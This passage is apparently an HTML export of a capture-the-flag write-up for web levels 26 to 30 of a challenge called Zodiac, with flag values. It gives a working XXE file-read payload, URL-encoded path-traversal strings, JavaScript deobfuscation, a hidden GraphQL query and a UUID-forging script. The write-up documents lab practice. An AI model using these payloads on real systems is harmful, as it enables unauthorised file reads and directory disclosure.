+</p><h1 id="7ce99c67-01e7-4d7f-8dd6-abb5437b10f1" class="">Level 26</h1><ul id="240dd237-dff9-41e9-9594-9e7126dfd77d" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="a122afc6-e576-4b47-8326-70c086b110f1" class="bulleted-list"><li style="list-style-type:disc">Oh I got the <code>final flag</code> =)</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="36ad6e4e-1c6e-4b2b-9d77-b2ced1b67abb" class="code"><code class="language-JavaScript">&lt;!--- 
+        Congratulations! You&#x27;ve solved the challenge and are eligible to participate in the lottery. Please submit the flag flag_c8252446995e4b5803969899cc4fdb85 to @mr_msa3 on Telegram, including the following information, each on a separate line:
+        Academy profile: https://voorivex.academy/profile/[your_username]
+        Flag: flag_c8252446995e4b5803969899cc4fdb85
+        #zodiac_talent_challenge_solved_z
+        Write-up in PDF format (not a URL or other formats)
+        Additionally, you should submit the flag on the Academy website. Remember, you may need to know the flag format for the last level: flag_[md5]. If you need to calculate a hash, do not alter the text (do not add spaces, change the case of the letters, etc.). If you manage to solve the last level, you will have twice the chance of winning in the lottery.
+---&gt;</code></pre><ul id="e279738c-0eaf-41c1-bd97-393f04f4fe60" class="bulleted-list"><li style="list-style-type:disc">After 30 seconds happiness went to sleep because I noticed something is cooking</li></ul><ul id="e0f378ce-6056-4105-91bc-3cb0402b7666" class="bulleted-list"><li style="list-style-type:disc">A function named <code>key()</code> so I tried to run it from browser console and there was no output :(</li></ul><ul id="1b2125d6-a766-4c63-b7c6-805bbed64336" class="bulleted-list"><li style="list-style-type:disc">So I started to analyze the code</li></ul><ul id="e73e5bb7-c8a3-44e3-81a5-ed0d850d37b2" class="bulleted-list"><li style="list-style-type:disc">Noticed that the function <code>_0x5f5e</code> is slicing the string until it becomes empty. why? zodiac knows =)</li></ul><ul id="696fe520-b9f7-474e-9279-edd4ff89cac3" class="bulleted-list"><li style="list-style-type:disc">So I tried to remove it and rewrite the function.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="14ddc4a3-795f-4e3d-8f32-8ceac5217649" class="code"><code class="language-JavaScript">function newkey() {
+    const _0xabc1 = &#x27;\x77\x39\x64\x38\x72\x49\x43\x45\x68\x49&#x27;;
+
+    const _0xdef2 = (function () {
+        const _0x4e5d = [0x3, 0x14 ^ 0x10 + 13, 0x3 ^ 0x1, 0x6 ^ 0xb, 0x1 ^ 0x2, 0x9 ^ 0x1, 0x6, 0x4 ^ 0x1 - 3, 0x8 ^ 0x4, 0x2];
+        return _0x4e5d.map(_0x1f2b =&gt; Math.sqrt(_0x1f2b * _0x1f2b) + 0 | 0);
+    })();
+
+    const _0x5a6b = (_0x7d8f) =&gt; {
+        return {
+            _0x9b0c: (_0x1c2b, _0x8d0a) =&gt; {
+                const _0x7c2e = _0x7d8f[_0x8d0a];
+                return String.fromCharCode(_0x1c2b.charCodeAt(0) ^ (_0x7c2e - _0x7c2e + _0x7c2e));
+            },
+            _0xb6d0: () =&gt; _0x7d8f
+        };
+    };
+
+    const _0x789a = _0x5a6b(_0xdef2);
+
+    let _0x3d4f = (function () {
+        const _0x3d4f = Array.prototype.reduce.call(
+            Array.prototype.map.call(
+                _0xabc1,
+                (_0x6a1e, _0x274b) =&gt; _0x789a._0x9b0c(_0x6a1e, _0x274b)
+            ),
+            (_0x4c5f, _0x392e) =&gt; _0x4c5f + _0x392e,
+            &#x27;&#x27;
+        );
+
+        return _0x3d4f;
+    })();
+
+    return _0x3d4f;
+}</code></pre><ul id="80aa9090-59ac-49e7-96d7-c1cfb2aaab70" class="bulleted-list"><li style="list-style-type:disc">Then I ran <code>newkey()</code> in browser console and it returned the next level.</li></ul><h3 id="0c9a6622-a5f9-43b7-8970-c02aafe294c8" class="">FLAG: <mark class="highlight-red"><code>/t0f5qAECdK</code></mark></h3><p id="86d87d79-4a73-4e7f-8952-e9e4f7f50525" class="">
+</p><h1 id="2eea6393-b433-45a7-8fdc-b416b1de2456" class="">Level 27</h1><ul id="fa625513-5d3f-471e-a23e-4c565607cdb9" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="00e3e7ef-0779-40af-bdeb-5f18578a8473" class="bulleted-list"><li style="list-style-type:disc">Noticed an external JavaScript <mark class="highlight-default">(</mark><code>statics/js/script.js</code><mark class="highlight-default">) </mark>code and opened it.</li></ul><ul id="e46bd00c-9653-447d-ba4d-b8ca83a0fc4c" class="bulleted-list"><li style="list-style-type:disc">It contained an script that runs a function <code>runQuery</code>.</li></ul><ul id="c1730c82-82dd-4638-a945-63c85a93c051" class="bulleted-list"><li style="list-style-type:disc">Noticed the <code>statics/js/graphql.js</code> path and opened it.</li></ul><ul id="1f433f81-104c-4824-a5bb-23bce2c0f8e1" class="bulleted-list"><li style="list-style-type:disc">lol another script that requests to <code>/graphql</code> , opened it.</li></ul><ul id="0d94ecc9-3abb-4a5b-97af-7aac03560546" class="bulleted-list"><li style="list-style-type:disc">Apollo opened but I could only get the <code>books</code> data. so I re-analyzed the <code>statics/js/graphql.js</code> .</li></ul><ul id="ba390620-c9bb-4316-888e-947f29908fa8" class="bulleted-list"><li style="list-style-type:disc">Noticed another path <code>/graphql-dev</code> .</li></ul><ul id="252672a4-06de-4b22-a17e-1f842e080fab" class="bulleted-list"><li style="list-style-type:disc">I opened it and saw a query named <code>s3kretz</code> with 3 fields .</li></ul><ul id="71ffd731-e2fd-4443-a4db-863adcd803fd" class="bulleted-list"><li style="list-style-type:disc">Tried to get it but it returned <code>null</code> .</li></ul><ul id="5185980b-da15-403b-beff-64d3133ed187" class="bulleted-list"><li style="list-style-type:disc">So I took the query and used it in <code>/graphql</code> path.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1d1df03d-1ebf-43df-8913-7ab6404cf78b" class="code"><code class="language-GraphQL">query s3kretz {
+  s3kretz {
+    value
+  }
+}</code></pre><ul id="d17eb9da-0577-4f4d-9d40-9fae2d1ac8b9" class="bulleted-list"><li style="list-style-type:disc">Then it returned the next level.</li></ul><h3 id="6c177bbf-b2da-4253-b8d7-6b544aea849a" class="">FLAG: <code>/0OEgQX7Rvc</code></h3><p id="ce90454a-ea50-426f-a4b7-67ff321414be" class="">
+</p><p id="3ea07797-6af8-4354-bc4d-91d28785a4b7" class="">
+</p><h1 id="8c7b5dd0-eb85-4ecc-a614-23794ca4e930" class="">Level 28</h1><ul id="ac8637d5-aced-4bc0-bfb3-f3b6c49e17b7" class="bulleted-list"><li style="list-style-type:disc">Hmmm, 2 pictures unusual.</li></ul><ul id="4500a3f2-0006-4d82-ab71-a278f27760ae" class="bulleted-list"><li style="list-style-type:disc">Picture 1 URL seems to need an <code>uuid (/?uuid=)</code> .</li></ul><ul id="640506f4-f211-4fa4-8cdb-5cb0925cbdf8" class="bulleted-list"><li style="list-style-type:disc">Picture 2 URL gave hint about <code>?ShowSource</code> parameter.</li></ul><ul id="c9af727b-5b8f-493c-afe0-287911afce3b" class="bulleted-list"><li style="list-style-type:disc">Opened the source code.</li></ul><ul id="bac7e280-8a1b-4fa1-ae3c-ef7ad3b8d3c2" class="bulleted-list"><li style="list-style-type:disc">I understood that its creating <code>uuid</code> based on <code>datetime</code> .s</li></ul><ul id="de015da6-ce1a-49ec-a3ab-52e0ee22f9d3" class="bulleted-list"><li style="list-style-type:disc">I thought, what datetime ? It may be hidden.</li></ul><ul id="60ef935e-7a63-4858-9e2e-94e2cc7ae9f9" class="bulleted-list"><li style="list-style-type:disc">Then I got the idea to check the picture’s <mark class="highlight-red"><code>metadata</code></mark> using <code>exiftool</code> tool .</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f3cbe2fb-477e-4bd7-bc08-0cd02b164b1e" class="code"><code class="language-JavaScript">./exiftool ../zodiac-01.jpg //picture 1
+./exiftool ../zodiac-02.jpg //picture 2</code></pre><ul id="25858893-1c66-4993-b960-ce8ae28dbc2f" class="bulleted-list"><li style="list-style-type:disc">Then noticed <code>File Modification Date/Time</code> of them.</li></ul><ul id="ec06a959-9221-4fe1-acca-a559bde98f4f" class="bulleted-list"><li style="list-style-type:disc">Then used the <code>generateUUID</code> script to get the <code>uuid</code> .</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9066e916-9d45-4b56-bded-ae27aee7b8c0" class="code"><code class="language-PHP">&lt;?php
+$timestr = &#x27;TIME&#x27;;
+ 
+function generateUUID($dateString) {
+    // Parse the date string
+    // Format: Mon, 17 Jul 1954 12:34:21 GMT
+    $dateTime = new DateTime($dateString, new DateTimeZone(&#x27;GMT&#x27;));
+    $time = $dateTime-&gt;format(&#x27;U&#x27;); // Unix timestamp
+
+    // Calculate the UUID timestamp
+    $timestamp = ($time * 10000000) + 0x01B21DD213814000;
+
+    // Get the time-related fields
+    $time_low = $timestamp &amp; 0xFFFFFFFF;
+    $time_mid = ($timestamp &gt;&gt; 32) &amp; 0xFFFF;
+    $time_hi_and_version = ($timestamp &gt;&gt; 48) &amp; 0x0FFF;
+    $time_hi_and_version |= (1 &lt;&lt; 12); // Set the version to 1
+
+    // Generate random clock sequence and node
+    $clock_seq = substr($time, 1, 4);
+    $clock_seq_hi_and_reserved = ($clock_seq &amp; 0x3F00) &gt;&gt; 8;
+    $clock_seq_hi_and_reserved |= 0x80; // Set the variant to 1 (10xx)
+
+    $clock_seq_low = $clock_seq &amp; 0xFF;
+    $node = bin2hex(substr($time, 4, 10));
+
+    // Format the UUID
+    $uuid = sprintf(
+        &#x27;%08x-%04x-%04x-%02x%02x-%012s&#x27;,
+        $time_low,
+        $time_mid,
+        $time_hi_and_version,
+        $clock_seq_hi_and_reserved,
+        $clock_seq_low,
+        $node
+    );
+
+    return $uuid;
+}
+$mine = generateUUID($timestr);
+echo $mine;
+?&gt;</code></pre><ul id="a4ef7b96-1b3b-45b8-82b2-47481892f8bf" class="bulleted-list"><li style="list-style-type:disc">finally tested <code>uuids</code> on <code>/?uuid=</code> and found the correct time <code>Sat, 05 Dec 2020 12:44:22 GMT</code> .</li></ul><ul id="96a4a2e3-189e-41ad-988a-d8d65e462e56" class="bulleted-list"><li style="list-style-type:disc">The <code>uuid</code> was <code>9932d700-36f7-11eb-97b7-313732323632</code> .</li></ul><h3 id="c5e9bea1-4670-4da1-8d80-c0c222a97de5" class="">FLAG: <code>/JdYb9PwavE</code></h3><p id="6de9d2ba-590d-459a-b275-299a77ebde38" class="">
+</p><h1 id="29c20214-3b20-4832-8d96-2d1b6ad4e435" class="">Level 29</h1><ul id="ed88f880-198e-4c69-8882-96e6a17ca924" class="bulleted-list"><li style="list-style-type:disc">Send a sample request and got the answer from fetch.</li></ul><ul id="b226274b-1318-40d7-8a3a-0e926e5a7d53" class="bulleted-list"><li style="list-style-type:disc">It’s saying to <code>get the /next.level from the server</code> (directory exploration didn’t work) .</li></ul><ul id="1a38bb6f-8a2c-4d7e-90b3-18ee6214dcbe" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="496a83c7-fa83-464c-9ca0-55e860f5f9d4" class="bulleted-list"><li style="list-style-type:disc">Noticed an external JavaScript <mark class="highlight-default">(</mark><code>statics/js/script.js</code><mark class="highlight-default">) </mark>code and opened it.</li></ul><ul id="5a28397b-e012-44b5-9d13-e1c090289303" class="bulleted-list"><li style="list-style-type:disc">It seems something is cooking.</li></ul><ul id="a58ba12d-925b-4b4e-a7e6-3e0b1631cfb7" class="bulleted-list"><li style="list-style-type:disc">It’s sending JSON data, I tried to send some but nothing special.</li></ul><ul id="a813e0b6-ccd0-4bd4-b9a7-ca8b1fd82814" class="bulleted-list"><li style="list-style-type:disc">Then I remembered the encoding type level. so I tried to change the <code>Content-Type: application/xml</code> .</li></ul><ul id="0018f630-5c19-499f-96e7-b161f67610c8" class="bulleted-list"><li style="list-style-type:disc">Oh server answered, this means it supports <code>xml</code> . so we can use XXE here.</li></ul><ul id="385a8216-395e-444f-8778-73ee7c01ff6e" class="bulleted-list"><li style="list-style-type:disc">Then I wrote a xml payload to get <code>next.level</code> from server.</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ff17a0eb-ee18-4071-b15b-57a92f15097b" class="code"><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM &quot;/next.level&quot;&gt;]&gt;
+&lt;test&gt;
+	&lt;name&gt;
+		&amp;file;
+	&lt;/name&gt;
+&lt;/test&gt;</code></pre><ul id="7871a6f8-ad54-4eb7-9773-09d5ec4aa133" class="bulleted-list"><li style="list-style-type:disc">Then server passed me the next level.</li></ul><h3 id="b8eda98a-59a3-4c64-9ccb-f72e52bde969" class="">FLAG: <code>/QZGuyWxC2O</code></h3><p id="1752fa00-b1f7-481c-b952-2fb9f932ec82" class="">
+</p><h1 id="70d9bfbe-78f5-43b4-9282-d5babbab057c" class="">Level 30</h1><ul id="48f67800-09b0-4948-bdcd-3a5d81054994" class="bulleted-list"><li style="list-style-type:disc">Of what the hack is this … this seems to be a puzzle.</li></ul><ul id="3321385f-e2d4-47d1-b227-2170e475ec31" class="bulleted-list"><li style="list-style-type:disc">Opened <code>view page source code</code> in browser to check the code.</li></ul><ul id="fc0ce691-b090-4146-a7dc-db8b2601afa6" class="bulleted-list"><li style="list-style-type:disc">Noticed the text <mark class="highlight-default">(</mark><code>&lt;!-- Scanning dir: , Result: NULL --&gt;</code><mark class="highlight-default">) in the </mark>code.</li></ul><ul id="72992c02-88d3-45ba-9218-3b91f7dd1d6e" class="bulleted-list"><li style="list-style-type:disc">It it scanning directory so lets try to go to the <code>/files/</code> .</li></ul><ul id="1e78faf0-f01c-4019-8467-a0f7a5ef18fa" class="bulleted-list"><li style="list-style-type:disc">Oh I cannot access it, lets try <code>/admin/</code> . page loaded and it says <code>&lt;!-- Scanning dir: ./admin , Result: NULL --&gt;</code> .</li></ul><ul id="2221f024-2480-474d-8666-06a6c72170f0" class="bulleted-list"><li style="list-style-type:disc">It seems to be a path traversal, let’s try some payloads.</li></ul><ul id="e3c6ddbc-dce0-4feb-bc3f-018a31029d46" class="bulleted-list"><li style="list-style-type:disc">I tried normal traversal but didn’t work, so let’s try encoded =)<ul id="68b4bd35-3457-4b27-ac1e-e917d0a18473" class="bulleted-list"><li style="list-style-type:circle"><code>%2e%2e%2f</code> represents <code>../</code></li></ul><ul id="5ab5489f-7c1a-40fa-b28e-b6f10b50e2eb" class="bulleted-list"><li style="list-style-type:circle"><code>%252e%252e%255c</code> represents <code>..\</code></li></ul><ul id="7b9e89de-f8d9-48f2-9b8a-19cacd1d98be" class="bulleted-list"><li style="list-style-type:circle">…</li></ul></li></ul><ul id="51f22d3f-e7c6-4da3-beed-18f697419e1d" class="bulleted-list"><li style="list-style-type:disc">While trying <code>%252e%252e%255c</code> website raised <code>security error</code> ,  oh got you!!</li></ul><ul id="841b3365-1a0e-4791-ba28-e9d5fafc101f" class="bulleted-list"><li style="list-style-type:disc">Then I noticed it is issuing dots(.) so I removed them and sent <code>%252F</code> .</li></ul><ul id="4b65ea8e-7442-4933-8428-4e82c726c54c" class="bulleted-list"><li style="list-style-type:disc">It worked =) and shows the directories.</li></ul><ul id="2e6d2d63-592c-497a-a2cf-67320525a2b9" class="bulleted-list"><li style="list-style-type:disc">Noticed <code>secret_files_Zz</code> directory so passed it to scanner which gave me the <code>zodiac_key</code> directory =)</li></ul><ul id="06e91eb4-9cf7-4044-83a7-daf74e67d5da" class="bulleted-list"><li style="list-style-type:disc">So opened the directory <code>/secret_files_Zz /zodiac_key</code> manually and the final key was there :))</li></ul><ul id="d550eba4-fddb-4480-b094-9578bd673d08" class="bulleted-list"><li style="list-style-type:disc">I started decoding the original photo of zodiac challenge and boom =)</li></ul><figure id="a8397764-c43f-4588-ae91-37d9474a976f" class="image"><a href="./img/zodiac-key.jpeg"><img style="width:576px" src="./img/zodiac-key.jpeg"/></a></figure><p id="4d76fcdf-5f72-47bb-bb34-942508b9732c" class="">
+</p><h3 id="bece5475-4233-4a1c-a181-64c2c0d48a48" class="">FINAL FLAG:</h3><ul id="38c0c163-61a2-4fc7-bcc0-2a051ddbff75" class="bulleted-list"><li style="list-style-type:disc"><strong>DECODE</strong></li></ul><p id="c489d592-1701-4940-a5d3-3f5c86295c05" class=""><code>BRAVOYOUHAVESOLVEDTHEZODIACCHALLENGEPLEASEHASHTHISTEXTANDSUBMITITASTHEFLAGINFLAGFORMATTOCOMPLETETHECHALLENGE</code></p><ul id="e7f67075-1b0b-4930-ba54-14fd527a0f78" class="bulleted-list"><li style="list-style-type:disc"><strong>MD5</strong></li></ul><p id="881472d7-b7db-4fa9-8e73-0bafe1597992" class=""><code>07784d4d426ee156122d087e8b52eefe</code></p><ul id="adf64659-cdf9-4206-990e-369aee8a25d1" class="bulleted-list"><li style="list-style-type:disc"><strong>FINAL</strong></li></ul><p id="5bdea1c9-5f24-435e-bfac-ac610ae0f894" class=""><code>flag_07784d4d426ee156122d087e8b52eefe</code></p><p id="2b5a63b5-9680-4505-9970-38bd82424d8a" class="">
+</p><p id="8eda77fc-bdad-4d43-96f0-598b87b9d0ca" class="">
+</p><h2 id="fc4fce0d-e666-4b1a-8f7a-f596df5ff17a" class=""><mark class="highlight-red_background">Thanks to all those who contributed to this challenge .</mark></h2><h3 id="7e5963a3-1cf3-42f2-bb94-0301ac53adf9" class=""><mark class="highlight-default">Write-up by </mark><mark class="highlight-red">github.com/vauth</mark><mark class="highlight-default"> - </mark><mark class="highlight-red">feelded.t.me</mark></h3><p id="987f4f92-f7d5-436d-afdc-aa0cb8a99dd7" class="">
+</p><p id="56dd743f-8f6d-4140-b13c-91165da45e88" class="">
+</p><p id="31ba78ec-140a-4ad1-aed1-bbe2266ba660" class="">
+</p><p id="7f1b1f7c-3597-41e2-91a3-afe0e5d2a42c" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
